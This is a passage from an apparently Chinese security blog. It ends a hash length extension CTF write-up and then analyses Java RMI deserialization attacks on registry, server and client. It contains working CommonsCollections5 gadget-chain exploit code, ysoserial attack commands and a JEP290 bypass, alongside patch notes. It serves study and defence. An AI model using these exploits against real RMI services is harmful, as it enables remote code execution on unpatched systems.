<li>flag的长度不知，salt为0～255之间的值</li>
<li>password为123456</li>
</ul>
<p>看起来似乎差了flag的长度和salt值，实际上这可以通过爆破来求出flag的值以及salt的值。</p>
<p>利用hashpumpy工具直接编写脚本，十分方便。</p>
<ul>
<li><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a></li>
<li>python <code>pip install hashpumpy</code></li>
</ul>
<p>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        x, y = hashpumpy.hashpump(<span class="string">'e23879e9135448a6b42f7843a7aeb940'</span>, <span class="string">'123456'</span> + str(j), <span class="string">'ananaskr'</span> + str(j), i)</span><br><span class="line">        data = &#123;<span class="string">"name"</span>: <span class="string">"admin"</span>, <span class="string">"password"</span>: y[:-len(str(j))], <span class="string">"hah"</span>: x&#125;</span><br><span class="line">        req = requests.post(data=data, url=<span class="string">'http://xx.xx.xx.xx:31016'</span>)</span><br><span class="line">        <span class="keyword">if</span> len(req.text) != <span class="number">478</span>:</span><br><span class="line">            print(req.text)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://seaii-blog.com/index.php/2017/05/12/56.html" target="_blank" rel="noopener">hash长度扩展攻击研究</a></li>
<li><a href="https://xz.aliyun.com/t/2563#toc-5" target="_blank" rel="noopener">哈希长度拓展攻击(Hash Length Extension Attacks)</a></li>
</ul>
]]></content>
      <categories>
        <category>密码攻击</category>
      </categories>
  </entry>
  <entry>
    <title>Java RMI攻击方式分析总结</title>
    <url>/2020/05/29/rmi-security/</url>
    <content><![CDATA[<p>RMI是一个基于序列化的Java远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。与RMI相关的攻击方式主要是:</p>
<ul>
<li>直接攻击RMI</li>
<li>JNDI注入</li>
</ul>
<p>这篇文章主要总结RMI自身的安全问题，分析注册中心、客户端与服务端之间的交互通信流程并总结攻击RMI注册中心，RMI服务端以及RMI客户端的方式。</p>
<a id="more"></a>
<h1 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h1><p>RMI依赖的通信协议为JRMP，该协议为Java定制，要求服务端与客户端均为Java编写。反序列化漏洞主要与JRMP有关，在通信过程中时通过序列化方式进行编码传输的。无论在JRMP的客户端还是服务端，当接收到JRMP协议数据时，都会将序列化的数据进行反序列化，因此造成了RMI注册中心、RMI服务端、RMI客户端都易受攻击的局面。</p>
<p>RMI分为三个主体部分:</p>
<ul>
<li>Client-客户端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">HelloInterface hello &#x3D; (HelloInterface) registry.lookup(&quot;hello1&quot;);</span><br><span class="line">System.out.println(hello.sayHello(&quot;flag&quot;));</span><br></pre></td></tr></table></figure>

<ul>
<li>Server-服务端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HelloImpl remote  &#x3D; new HelloImpl();</span><br><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(1099);</span><br><span class="line">registry.bind(&quot;hello1&quot;, remote);</span><br></pre></td></tr></table></figure>

<ul>
<li>Registry-注册中心</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一般注册中心和服务端都是在一块，因为注册中心仅允许来自本地的bind/rebind/unbind请求。在这里我们把它们作为独立的个体描述。</p>
</blockquote>
<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2><p>任何可以被远程调用的方法的对象就是远程对象，它一般在服务端。用于提供客户端进行方法调用。它必须实现<code>java.rmi.Remote</code>接口，且需要继承UnicastRemoteObject类。(<font color=#824032>继承UnicastRemoteObject类是为了方便自动调用其exportObject()方法来生成本地Stub的代理对象，然后调用LiveRef.exportObject()方法来启动socket服务</font>)。  </p>
<p>注册中心也是一个远程对象，默认监听在1099端口上，与普通远程不一样的是，它需要自己指定端口。</p>
<h1 id="注册中心与服务端"><a href="#注册中心与服务端" class="headerlink" title="注册中心与服务端"></a>注册中心与服务端</h1><p>服务端与注册中心之间的交互主要是服务端向注册中心绑定服务，即bind/rebind操作。关注bind代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(1099);</span><br><span class="line">registry.bind(&quot;hello&quot;,obj);</span><br></pre></td></tr></table></figure>

<p><font color=#4682B4>[服务端]</font>首先getRegistry(1099)获取到了注册中心存根RegistryImpl_Stub(即注册中心RegistryImpl的代理)，然后调用其bind函数。定位到此函数.</p>
<p><img src="9.png" alt=""></p>
<p>先newCall建立连接，然后将object序列化发送至注册中心。注意这里的opnum参数，它代表了当前的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 : bind</span><br><span class="line">1 : list</span><br><span class="line">2 : lookup</span><br><span class="line">3 : rebind</span><br><span class="line">4 : unbind</span><br></pre></td></tr></table></figure>

<p><font color=#43CD80>[注册中心]</font>此时注册中心，接收数据的为<code>RegistryImpl_Skel#dispatch</code>。需要明白的是，RMI就是通过Stub和Skeleton在客户端和服务端传输数据。这里的var3即前面发送的opnum参数为0，即bind操作，这里直接定位到case 0:的部分。case 0中的0代表的是bind操作。</p>
<p><img src="12.png" alt=""></p>
<p>在这里完成了反序列化操作后，进入<code>sun.rmi.registry.RegistryImpl#bind</code>函数。</p>
<p><img src="13.png" alt=""></p>
<p>在这里可以看到，它在put函数之前，做了对于是否是本地的绑定的判断<code>checkAccess(&quot;Registry.bind&quot;)</code>。仅允许来自本地的bind操作。同理，可以看到，rebind/unbind操作都只能在本地完成。</p>
<p>在完成这个bind操作之后，就进入getResultStream()函数，跟进它。</p>
<p><img src="14.png" alt=""></p>
<p>它会向当前连接中发送81这个传输返回码，然后发送1这个值以及ID。到这里注册中心的部分完成了，继续往回看服务端的处理。关于81以及1这个数字的含义如下。发送81代表是返回，而紧随的数字1，表示是正常返回。</p>
<p><img src="17.png" alt=""></p>
<p><font color=#4682B4>[服务端]</font>服务端在发送完bind的数据后，接着执行super.ref.invoke()方法，其实也就是UnicastRef.invoke()方法，在这里面继续执行var1.executeCall()函数。跟进该函数。</p>
<p><img src="10.png" alt=""></p>
<p>在该函数中确实接收到了注册中心的返回值，首先反序列化出var4传输返回码，该值必须为81.前面也确实传了81这个值。紧接着反序列化出var1。该值为1。因此进入case 1:的分支，直接返回了。但从代码中可以看到，若var1的值为2，则会进行反序列化。到这里整个流程分析结束了。</p>
<p><img src="15.png" alt=""></p>
<p>可以看到在上述的过程中，服务端和注册中心都有能够反序列化的点。</p>
<h2 id="服务端攻击注册中心–bind-JDK-lt-8u121"><a href="#服务端攻击注册中心–bind-JDK-lt-8u121" class="headerlink" title="服务端攻击注册中心–bind (JDK&lt;8u121)"></a>服务端攻击注册中心–bind (JDK&lt;8u121)</h2><p>服务端在进行bind时，将name和object发送至注册中心，注册中心在这里进行了直接的反序列化。前面提到过，为了安全起见，仅接收本地的bind请求，只是这个判断checkAcess(“Registry.bind”)发生在反序列化之后。因此造成了，虽然bind失败，但反序列化已经发生了。</p>
<p>因此，向注册中心bind/rebind一个精心构造的remote对象，即可造成RCE。这里可以选择CommonsCollections系列的gadget进行利用。前提是注册中心也存在对应的gadget。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>这是一个绑定了恶意的远程对象的服务端代码，利用了CommonsCollections5。构造了一个BadAttributeValueException对象，由于传过去的对象需要实现Remote接口，选择了动态代理的方法来满足这一条件。在这里的动态代理类选择了AnnotationInvocationHandler。反序列化的触发点为handler的memberValues属性即tmpMap被反序列化时执行了利用链，从而RCE了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            tmpMap.put(<span class="string">"pwn"</span>, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="keyword">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">tmpMap</span>)</span>;</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">"hello1"</span>, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行这段代码后，注册中心就弹出了计算器(环境为JDK8u111)。这段代码同时也是ysoserial工具的RMIRegistryExploit代码。该工具的利用方式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip port CommonsCollections7 &quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><ul>
<li>在JDK8u141之后，将判断是否为本地绑定请求挪到了执行反序列化之前，如下所示:</li>
</ul>
<p><img src="16.png" alt=""></p>
<ul>
<li>JDK8u121修复版本后，出现了JEP290。它在注册中心端内置了白名单，仅允许特定的类被反序列化。而上述代码使用的AnnotationInvocationHandler类不在白名单中，不允许反序列化。(后面介绍了绕过方式)</li>
</ul>
<h2 id="注册中心攻击服务端"><a href="#注册中心攻击服务端" class="headerlink" title="注册中心攻击服务端"></a>注册中心攻击服务端</h2><p>服务端在接收注册中心返回值时，若返回的是TransportConstants.ExceptionReturn，即值为2，就会进入case 2的分支，进行反序列化。因此注册中心攻击服务端的方式，就是伪造一个恶意的注册中心，向服务端返回TransportConstants.Return、TransportConstants.ExceptionalReturn、UID以及恶意的object。  </p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>ysoserial工具实现了这么一个恶意的注册中心，<code>ysoserial.exploit.JRMPListener</code>。截取部分关键代码，如下所示:</p>
<p><img src="18.png" alt=""></p>
<p>可以看到它发送了81，2，ID以及恶意的obj。复现的方式很简单，首先用ysoserial启动一个注册中心。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<p>然后启动服务端代码，进行bind操作，就会发现在服务端弹出了计算器。</p>
<h2 id="绕过JEP290-JDK-lt-8u232-b09"><a href="#绕过JEP290-JDK-lt-8u232-b09" class="headerlink" title="绕过JEP290 (JDK&lt;8u232_b09)"></a>绕过JEP290 (JDK&lt;8u232_b09)</h2><p>前面攻击注册中心时，在JDK8u121后，就出现了JEP290限制。要绕过这个限制，需要在白名单中找到可以利用的对象。这里关注<code>UnicastRef</code>对象。  在RMI过程中客户端与注册中心、服务端与注册中心之间建立连接都用到了UnicastRef类。用UnicastRef对象新建一个RMI连接可以绕过JEP290的限制。</p>
<p>整个思路就是:封装一个UnicastRef对象，其中包括恶意注册中心的ip和port。使得其在原注册中心被反序列化时，反向连接一个恶意注册中心，此时原注册中心相当于客户端，由1.2攻击可知，恶意注册中心向客户端发送恶意的payload，这一过程是不受JEP290影响的。</p>
<p>来看一下客户端连接上注册中心的具体实现，定位到<code>java.rmi.registry#getRegistry</code>。<br><img src="31.png" alt=""></p>
<p>它通过TCPEndpoint注册注册中心的host、port等信息。然后用UnicastRef封装了LiveRef类。最后进入Util.createProxy()方法。跟进此方法。</p>
<p><img src="32.png" alt=""></p>
<p>在该函数中，使用动态代理处理类RemoteObjectInvocationHandler作为UnicastRef动态处理类。到这里整个连接过程结束了。事实上只需要封装一个包含恶意注册中心的host、port的UnicastRef类，然后使用RemoteObjectInvocationHandler动态代理它。</p>
<p>ysoserial工具中实现了向原注册中心(受害者)发送UnicastRef对象的JRMPClient。<code>ysoserial.payloads.JRMPClient</code>。来看一下它的关键代码。</p>
<p><img src="30.png" alt=""></p>
<p>可以看到与上述的过程一样。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先启动一个恶意的注册中心，可以利用JRMPListener实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<p>然后启动一个客户端，还是利用的是1.1攻击中ysoserial中的RMIRegistryExploit，其中payload选择ysoserial.payloads.JRMPClient而不是CommonsCollections。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 JRMPClient &quot;127.0.0.1:1098&quot;</span><br></pre></td></tr></table></figure>

<p>此时在注册中心弹出了计算器。注册中心在接收到UnicastRef对象后进行反序列化最终由DGCClient向恶意注册中心发起连接，即在反向连接的过程是DGC通信方式。有兴趣的可以自己跟一下过程。</p>
<h3 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h3><p>在JDK8u232_b09版本中，修复了这种反向发起JRMP连接的利用。修复点包括:</p>
<ol>
<li>在<code>sun.rmi.registry.RegistryImpl_Skel#dispath</code>中在反序列化时，若反序列化失败/类型转换失败，就会进入discardPendingRefs()。它会清除掉目前的RMI连接。</li>
</ol>
<p><img src="1-1.png" alt=""></p>
<ol start="2">
<li>第一个补丁，其实在清除之前已经执行了反序列化。但是在复现过程中还是失败了，因为在DGC通信中，对发送/接收的数据都进行了过滤。详情可见后面<code>4.1#补丁</code>。</li>
</ol>
<h1 id="注册中心与客户端"><a href="#注册中心与客户端" class="headerlink" title="注册中心与客户端"></a>注册中心与客户端</h1><p>客户端与注册中心的交互主要是客户端通过list()、lookup()函数向注册中心发出请求。与服务端一样，客户端首先通过LocateRegistry.getRegistry()获的RegistryImpl_Stub对象，跟进lookup()函数。</p>
<p><img src="19.png" alt=""></p>
<p><font color=#EE7942>[客户端]</font>与服务端一样，先建立连接，注意这里的opnum为2，代表的是lookup操作。它首先将查询的参数值String类型的变量发送出去。</p>
<p><font color=#43CD80>[注册中心]</font>注册中心这边同样是dispatch()函数处理。当case为2时，处理方式如下所示:</p>
<p><img src="20.png" alt=""></p>
<p>先反序列化传入的参数，然后进行lookup()操作，lookup()操作就是简单地根据name参数值查询绑定的Remote对象。完成这一部分后，与上面一样，注册中心向客户端返回值。然后还有一个把查询到的Remote对象进行序列化传输。</p>
<p><font color=#EE7942>[客户端]</font>客户端接收到注册中心的返回值后，进行的invoke函数与前面服务端一样。若接收到了ransportConstants.ExceptionalReturn就会进行反序列化。与服务端bind操作不同的是，在完成这一系列后，它还会从当前的输入流中反序列化出Remote对象。至此整个过程结束。</p>
<h2 id="客户端攻击注册中心-JDK-lt-8u121"><a href="#客户端攻击注册中心-JDK-lt-8u121" class="headerlink" title="客户端攻击注册中心(JDK&lt;8u121)"></a>客户端攻击注册中心(JDK&lt;8u121)</h2><p>这一点与服务端类似，即注册中心接收到客户端传过来的数据后，会进行反序列化。因此，若客户端lookup的参数值为一个object类型，就可以使得注册中心反序列化执行任意命令。因此，需要修改lookup函数，使之支持object类型参数。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>在构造lookup函数请求时，只需要重新实现lookup函数的实现。这里介绍wh1t3p1g师傅写的一个<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/exploit/rmi/component/Naming.java" target="_blank" rel="noopener">改造版lookup函数</a>。将Naming.lookup和RegistryImpl_Stub.lookup合并在一起了。</p>
<p><img src="33.png" alt=""></p>
<p>利用CommonsCollections5，构造如下payload。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1099</span>);</span><br><span class="line">            Naming.lookup(registry,badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中Naming的look函数实现，我从wh1t3p1g师傅写的代码中抽出来了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Naming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Naming</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception, IOException, ClassNotFoundException, RuntimeException, RemoteException, NotBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Field ref1 = getField(registry.getClass(),<span class="string">"ref"</span>);</span><br><span class="line">        RemoteRef ref = (RemoteRef) ref1.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> interfaceHash = <span class="number">4905912898345647071L</span>;</span><br><span class="line"></span><br><span class="line">        Field operations1 = getField(registry.getClass(),<span class="string">"operations"</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) operations1.get(registry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                out.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">"error marshalling arguments"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            java.rmi.Remote $result;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectInput in = call.getInputStream();</span><br><span class="line">                $result = (java.rmi.Remote) in.readObject();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                ref.done(call);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">"undeclared checked exception"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行客户端的代码，会在注册中心弹出计算器。</p>
<h3 id="补丁-2"><a href="#补丁-2" class="headerlink" title="补丁"></a>补丁</h3><p>相对于服务端的bind方式需要在本地执行，lookup函数没有这个限制。但是它同样受到JEP290的限制。  </p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过方式与前面所提的绕过方式一样。lookup一个UnicastRef对象。</p>
<h2 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h2><p>从这个过程中可以看到，客户端被攻击执行反序列化的条件和服务端杯攻击执行反序列化的条件一样。与1.2一样。这里就不再赘述了。若是不采用返回TransportConstants.ExceptionalReturn，也可以将返回的Remote对象换成恶意的object。</p>
<h1 id="客户端与服务端"><a href="#客户端与服务端" class="headerlink" title="客户端与服务端"></a>客户端与服务端</h1><p>客户端与服务端之间的交互过程，主要是在客户端通过lookup获取到了注册在注册中心的远程对象引用后，调用远程对象方法时。在调用方法时将与服务端进行连接，将方法及各项参数传输过去。服务端在接收到数据后，在服务端完成方法的调用，然后将结果返回给客户端的一个过程。接下来就来仔细分析一下它。</p>
<p>首先在这个过程中，客户端需要具有远程对象的接口。且其全限定名必须与服务器上的对象完全相同。可以理解为Stub对象是远程对象在本地的一个代理，当客户端调用方法时，Stub对象将会调用通过网络传递给远程对象。</p>
<p><font color=#EE7942>[客户端]</font>客户端在完成lookup查询后返回的远程对象Stub使用RemoteObjectInvocationHandler类进行动态代理，即在调用其任何方法之前，必须先调用RemoteObjectInvocationHandler#invoke方法。<br><img src="21.png" alt=""></p>
<p>跟进invokeRemoteMethod方法。<br><img src="22.png" alt=""></p>
<p>在这里进入UnicastRef.invoke()函数。继续跟进。<br><img src="23.png" alt=""></p>
<p>在该函数中，首先建立与服务端的连接，然后向服务端发送调用方法的参数类型、参数值。</p>
<p><font color=#4682B4>[服务端]</font>服务端接收处理客户端传过来的数据的函数在<code>sun.rmi.server.UnicastServerRef#dispatch</code>。定位到该函数</p>
<p><img src="24.png" alt=""></p>
<p>传入的var3为-1，直接进入后面，通过传入的var4，也就是方法的hash值，来查询到方法Method Var8。然后将输入流进行unmarshalCustomCallData，相当于解密一样。然后进入unmarshalParameters()函数，该函数中对var1进行了判断，然后进入unmarshalParametersUnchecked()函数，跟进该函数。</p>
<p><img src="25.png" alt=""></p>
<p>该函数中获取方法的参数类型，然后进入unmarshalValue，根据参数类型反序列化出参数值。跟进unmarshalValue函数。</p>
<p><img src="26.png" alt=""></p>
<p>这里会根据参数类型进行反序列化，若参数类型不是原生类型，则就直接进行object的反序列化readObject。</p>
<p><img src="2-2.png" alt=""><br>在反序列化得到参数值之后，回到dispatch方法，接着往下走，然后直接调用方法，获得方法调用的返回值var10。紧接着又到了熟悉的getResultStream(true)方法，这里会向客户端返回81、1以及ID值。</p>
<p>然后对方法调用的返回值进行判断，若返回值不为Void类型，进入marshalValue()方法。在marshalValue()方法中会对其进行序列化发送给客户端。</p>
<p><font color=#EE7942>[客户端]</font>客户端在完成发送数据之后，就会进入var7.executeCall()方法等待服务端的返回值，和之前一样，若接收到ransportConstants.ExceptionalReturn后，就会进行直接的反序列化。</p>
<p>然后继续获取方法调用的方法值，若该值不为void，会进入unmarshalValue()方法根据类型进行反序列化。到这里整个的方法调用就结束了。</p>
<p>从以上流程中可以进行反序列化的点来看，存在以下攻击。</p>
<h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>若客户端调用的方法参数类型为object类型，则传入一个恶意的object类型，进行反序列化则会导致服务端执行任意命令。实际场景中很少有object类型的参数。攻击者可以用恶意对象替换从Object类派生的参数。</p>
<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>将服务端的HelloInterface接口中的sayHello函数参数改为object类型。同时将客户端的HelloInterface接口中方法的参数改为object类型。</p>
<p>客户端的代码如下:</p>
